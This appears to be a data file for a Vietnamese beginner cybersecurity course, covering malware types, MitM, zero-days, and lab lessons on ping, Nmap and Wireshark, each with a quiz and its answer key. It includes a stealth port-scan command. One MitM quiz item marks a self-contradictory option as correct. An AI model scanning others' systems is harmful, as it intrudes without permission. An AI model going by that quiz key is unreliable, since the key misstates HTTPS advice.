          explanation: "XSS = Cross-Site Scripting. Hacker chèn mã độc để đánh cắp cookie/thông tin."
        }
      },
      {
        id: "lesson-3-4",
        title: "Malware — 'các loại bệnh máy tính'",
        summary: "Virus, Trojan, Ransomware, Spyware — mỗi loại một cách phá hoại khác nhau.",
        analogy: "Giống các loại bệnh: Virus như cảm cúm (lây lan), Ransomware như bắt cóc (đòi tiền chuộc), Spyware như gián điệp (theo dõi bạn), Trojan như ngựa Trojan (giả quà tặng thực ra là quân địch).",
        content: `## 5 loại Malware chính

| Loại | Giống | Cách phá |
|---|---|---|
| **Virus** | Cảm cúm | Lây từ máy sang máy, phá hủy file |
| **Trojan** | Ngựa Trojan | Giả phần mềm tốt, thực ra mở cửa cho hacker |
| **Ransomware** | Bắt cóc | Khóa dữ liệu, đòi tiền chuộc |
| **Spyware** | Gián điệp | Theo dõi, ghi lại phím bấm |
| **Worm** | Sâu | Tự lây qua mạng, không cần file đính kèm |

### Ransomware — Nguy hiểm nhất hiện nay
- Mã hóa toàn bộ ổ cứng
- Hiện thông báo 'Nộp $500 trong Bitcoin trong 72h'
- Nổi tiếng: WannaCry (2017), LockBit

### 3 cách phòng Malware:
1. **Sao lưu (Backup)** — 3-2-1 rule: 3 bản sao, 2 phương tiện, 1 bản ở nơi khác
2. **Không mở file lạ** — .exe, .vbs, .docm từ email lạ
3. **Cập nhật phần mềm** — vá lỗ hổng bảo mật`,
        estMinutes: 8,
        order: 4,
        exercise: {
          type: "match",
          question: "Ghép loại Malware với đặc điểm:",
          items: [
            { id: "a", text: "Khóa file, đòi tiền chuộc" },
            { id: "b", text: "Giả phần mềm hữu ích nhưng thực ra là cửa sau" },
            { id: "c", text: "Theo dõi và ghi lại thông tin người dùng" },
          ],
          options: ["Virus", "Trojan", "Ransomware", "Spyware", "Worm"],
          correctAnswer: ["Ransomware", "Trojan", "Spyware"],
          explanation: "Ransomware tống tiền, Trojan giả mạo, Spyware theo dõi."
        }
      },
      {
        id: "lesson-3-5",
        title: "Man-in-the-Middle — 'nghe lén thư từ'",
        summary: "Kẻ xấu đứng giữa bạn và web, nghe/xem/sửa mọi thứ hai bên gửi cho nhau.",
        analogy: "Giống nhân viên bưu điện mở thư của bạn ra đọc, chụp lại, có khi sửa nội dung rồi dán lại gửi tiếp. Bạn tưởng thư vẫn nguyên vẹn, không biết đã bị xem.",
        content: `## Tấn công MitM

### Cách hoạt động:
1. Bạn tưởng đang vào Facebook
2. Thực ra đang vào máy hacker (giả Facebook)
3. Hacker chuyển tiếp request đến Facebook thật
4. Cả 2 bên tưởng đang nói chuyện trực tiếp, nhưng hacker nghe hết

### Tình huống thực tế:
- **WiFi giả** — Hacker mở WiFi 'Free Airport WiFi'. Bạn kết nối, mọi dữ liệu đều qua tay hacker
- **ARP Spoofing** — Hacker trong cùng mạng WiFi giả làm Router
- **DNS Spoofing** — Gõ vietcombank.com → Hacker trả về IP web giả

### Phòng tránh:
| Biện pháp | Hiệu quả |
|---|---|
| **HTTPS** | ✅ Web có ổ khóa xanh — chống được MitM cơ bản |
| **VPN** | ✅ Mã hóa toàn bộ đường truyền |
| **Không dùng WiFi lạ** | ✅ Nếu không có VPN |

### Nhận biết:
- Ổ khóa trình duyệt màu ĐỎ hoặc bị gạch → KHÔNG được nhập mật khẩu
- Trang web không có 'https://' ở đầu → không nhập thông tin`,
        estMinutes: 7,
        order: 5,
        exercise: {
          type: "multiple-choice",
          question: "Bạn đang ở quán cà phê, kết nối WiFi 'Free Coffee'. Cách nào bảo vệ bạn khỏi MitM?",
          options: [
            "A. Không nhập mật khẩu trang nào có ổ khóa xanh HTTPS",
            "B. Dùng VPN trước khi vào web",
            "C. Dùng chế độ ẩn danh (Incognito)",
            "D. Cả A và B",
          ],
          correctAnswer: "D",
          explanation: "HTTPS chống đọc trộm nội dung, VPN mã hóa toàn bộ đường truyền chống giả mạo."
        }
      },
      {
        id: "lesson-3-6",
        title: "Zero-day & Patch — 'lỗ hổng chưa ai biết'",
        summary: "Zero-day là lỗ hổng mà nhà sản xuất chưa biết, chưa có vá. Patch là 'miếng vá' bịt lỗ.",
        analogy: "Zero-day giống ổ khóa nhà bạn bị hỏng mà chưa ai phát hiện — kẻ trộm biết trước bạn. Patch là khi thợ khóa đến sửa. Sau khi sửa, kẻ trộm hết đường vào.",
        content: `## Vòng đời của một lỗ hổng

### Zero-day là gì?
- Nhà sản xuất chưa biết → chưa có bản vá
- Hacker phát hiện → có thể khai thác
- Không có cách phòng trừ (vì chưa biết lỗ ở đâu)

### Khi Zero-day được phát hiện:
1. **Đen**: Nếu hacker mũ đen phát hiện → khai thác ngay
2. **Trắng**: Nếu hacker mũ trắng phát hiện → báo cho nhà sản xuất
3. **Patch**: Nhà sản xuất ra bản vá (thường 1-30 ngày)
4. **Cập nhật**: Người dùng cập nhật → hết lỗ

### Tại sao phải cập nhật phần mềm NGAY?
- Khi bản vá ra, hacker cũng biết có lỗ
- Chạy đua: Ai cập nhật trước thì an toàn
- **Cập nhật = Vá lỗ trên thuyền**
- Không cập nhật = đi thuyền thủng

### Ví dụ nổi tiếng:
- **Heartbleed** (2014) — Lỗ trong OpenSSL, ảnh hưởng 500.000 web
- **Log4j** (2021) — Lỗ trong thư viện Java, ảnh hưởng hàng tỷ thiết bị
- Khi lộ, hacker khai thác ồ ạt — công ty nào không vá kịp thì toi`,
        estMinutes: 7,
        order: 6,
        exercise: {
          type: "true-false",
          question: "Đánh giá:",
          items: [
            { id: "a", text: "Zero-day là lỗ hổng đã có bản vá" },
            { id: "b", text: "Cập nhật phần mềm giúp vá lỗ hổng bảo mật" },
            { id: "c", text: "Hacker mũ trắng báo lỗi cho nhà sản xuất" },
          ],
          correctAnswer: ["false", "true", "true"],
          explanation: "Zero-day là lỗ CHƯA có vá. Cập nhật là vá lỗ. Hacker mũ trắng giúp vá lỗ."
        }
      },
    ],
  },
  {
    id: "module-4",
    title: "Thực hành Lab",
    description: "Môi trường mô phỏng an toàn (Click & Play).",
    goal: "Tự tay thực hiện phòng thủ cơ bản.",
    order: 4,
    lessons: [
      {
        id: "lesson-4-1",
        title: "Ping — 'gọi thử Internet'",
        summary: "Học cách dùng lệnh ping — như gọi điện thử xem Internet còn sống không.",
        analogy: "Ping giống như gọi to 'Alo, anh Google ơi!' và chờ xem có tiếng trả lời không. Nếu có 'Reply', là máy bên kia còn sống.",
        content: `## Ping — kiểm tra kết nối cơ bản nhất

Ping là lệnh đơn giản nhất trong bảo mật. Nó gửi một gói tin ICMP nhỏ và chờ phản hồi.

### Cú pháp:
\`\`\`bash
ping google.com
\`\`\`

### Kết quả trả về:
- **Reply from 142.250.1.1: bytes=32 time=14ms TTL=117** — OK, kết nối được
- **Request timed out** — Mất kết nối (hoặc tường lửa chặn)
- **TTL** — Thời gian sống, đếm số chặng (hop) gói tin đi qua

### Ứng dụng bảo mật:
- Kiểm tra máy chủ còn hoạt động không
- Đo độ trễ (latency) — thời gian phản hồi
- Phát hiện mất kết nối mạng`,
        estMinutes: 5,
        order: 1,
        exercise: {
          type: "multiple-choice",
          question: "Kết quả 'Reply from 142.250.1.1: time=14ms' có nghĩa là gì?",
          options: [
            "A. Máy tính bạn đã gửi được 14 gói tin",
            "B. Kết nối thành công, thời gian phản hồi 14ms",
            "C. Địa chỉ IP bị lỗi, cần thử lại 14 lần",
            "D. Có 14 thiết bị đang kết nối",
          ],
          correctAnswer: "B",
          explanation: "Reply from + IP = kết nối OK. time=14ms = thời gian phản hồi nhanh."
        }
      },
      {
        id: "lesson-4-2",
        title: "Nmap — 'quét cổng nhà'",
        summary: "Nmap quét các 'cửa ra vào' (port) của máy tính — cửa nào mở, cửa nào đóng.",
        analogy: "Giống như đi quanh một tòa nhà kiểm tra cửa nào khóa, cửa nào mở. Hacker dùng Nmap để tìm 'cửa mở' để đột nhập.",
        content: `## Nmap — Network Mapper

Nmap là công cụ #1 trong Cybersecurity. Nó cho biết:
- Port nào đang mở (cửa nào có thể vào)
- Dịch vụ gì đang chạy (có gì trong phòng đó)
- Hệ điều hành gì (Windows/Linux)

### Cú pháp cơ bản:
\`\`\`bash
nmap -sS 192.168.1.1
\`\`\`

### Port là gì?
Port là 'số cửa' để các chương trình giao tiếp:
- **Port 80** — HTTP (web không bảo mật)
- **Port 443** — HTTPS (web bảo mật)
- **Port 22** — SSH (điều khiển từ xa)
- **Port 3306** — MySQL (cơ sở dữ liệu)
- **Port 3389** — RDP (Remote Desktop Windows)

### Đọc kết quả Nmap:
- **OPEN** — Cửa mở, có thể khai thác
- **FILTERED** — Có tường lửa chặn
- **CLOSED** — Cửa đóng, không có dịch vụ`,
        estMinutes: 8,
        order: 2,
        exercise: {
          type: "fill-blank",
          question: "Port ___ dùng cho HTTPS. Port 22 dùng cho ___ (giao thức điều khiển từ xa). Port 3306 dùng cho cơ sở dữ liệu ___.",
          correctAnswer: ["443", "SSH", "MySQL"],
          explanation: "HTTPS = 443, SSH = 22, MySQL = 3306."
        }
      },
      {
        id: "lesson-4-3",
        title: "Wireshark — 'bắt sóng' mạng",
        summary: "Wireshark 'nghe' mọi gói tin đi qua máy bạn — học cách đọc gói tin như chuyên gia.",
        analogy: "Wireshark giống như máy bộ đàm của cảnh sát — bạn bắt được mọi cuộc gọi (gói tin) trong khu vực. Có thể nghe, phân tích, tìm kiếm bất thường.",
        content: `## Wireshark — 'Nghe lén' mạng hợp pháp

Wireshark bắt toàn bộ gói tin (packet) đi qua máy tính. Mỗi gói tin chứa:
- **IP nguồn → IP đích** (ai gửi → ai nhận)
- **Giao thức** (HTTP, TCP, DNS...)
- **Nội dung** (nếu không mã hóa)

### Lọc cơ bản:
- \`http\` — Chỉ xem gói HTTP
- \`ip.addr == 192.168.1.1\` — Chỉ xem IP cụ thể
- \`tcp.port == 443\` — Chỉ xem port 443
- \`dns\` — Chỉ xem truy vấn DNS

### Tại sao quan trọng?
- Phát hiện kết nối lạ (malware đang 'gọi về nhà')
- Kiểm tra ứng dụng có gửi dữ liệu không mã hóa không
- Debug lỗi mạng

### Lưu ý:
- Chỉ bắt được gói tin trên mạng bạn có quyền
- Dùng để HỌC, không dùng để hack
- Cần quyền admin để chạy`,
        estMinutes: 8,
        order: 3,
        exercise: {
          type: "true-false",
          question: "Đánh giá:",
          items: [
            { id: "a", text: "Wireshark có thể xem nội dung gói tin HTTP không mã hóa" },
            { id: "b", text: "Bộ lọc 'dns' chỉ hiện gói tin DNS" },
            { id: "c", text: "Wireshark tự động phát hiện virus" },
          ],
          correctAnswer: ["true", "true", "false"],
          explanation: "HTTP không mã hóa nên Wireshark đọc được. Lọc DNS chỉ hiện DNS. Wireshark không phải antivirus."
        }
      },
      {
        id: "lesson-4-4",
        title: "Tổng kết — 'tự tin bảo vệ bản thân'",
        summary: "Ôn tập toàn bộ kiến thức và lập kế hoạch học tiếp theo.",
        analogy: "Bạn đã đi từ 'không biết gì' đến 'hiểu cách hacker nghĩ'. Giống như học võ — đã biết cách phòng thủ cơ bản, giờ cần luyện tập thường xuyên.",
        content: `## 🎉 Chúc mừng bạn đã hoàn thành khóa học!

### Những gì bạn đã học được:
| Giai đoạn | Bạn có thể |
|---|---|
| 1. Xóa mù CNTT | Hiểu máy tính, Internet, IP, DNS, giao thức |
| 2. Căn bản bảo mật | Đặt mật khẩu mạnh, nhận diện Phishing, bật 2FA |
| 3. Hacker tư duy | Hiểu Social Engineering, SQLi, XSS, Malware, MitM |
| 4. Thực hành | Ping, Nmap, Wireshark, phòng thủ cơ bản |

### 5 điều làm NGAY hôm nay:
1. ✅ Bật 2FA cho email và Facebook
2. ✅ Đổi mật khẩu yếu thành câu dài khó đoán
3. ✅ Cập nhật Windows/macOS/Điện thoại
4. ✅ Dùng VPN trên WiFi công cộng
5. ✅ Backup dữ liệu quan trọng

### Lộ trình học tiếp:
Nếu muốn đi sâu, hãy tìm hiểu:
- **CompTIA Security+** — Chứng chỉ bảo mật căn bản
- **TryHackMe** — Lab thực hành free
- **HackTheBox** — Thử thách hack hợp pháp`,
        estMinutes: 5,
        order: 4,
        exercise: {
          type: "multiple-choice",
          question: "Hành động nào QUAN TRỌNG NHẤT bạn nên làm NGAY sau khóa học này?",
          options: [
            "A. Mua VPN trả phí",
            "B. Bật 2FA cho email và cập nhật phần mềm",
            "C. Học thêm khóa khác ngay lập tức",
            "D. Mua máy tính mới",
          ],
          correctAnswer: "B",
          explanation: "2FA và cập nhật là 2 việc miễn phí, hiệu quả NHẤT. Làm ngay trước khi quên!"
        }
      },
    ],
  },
];
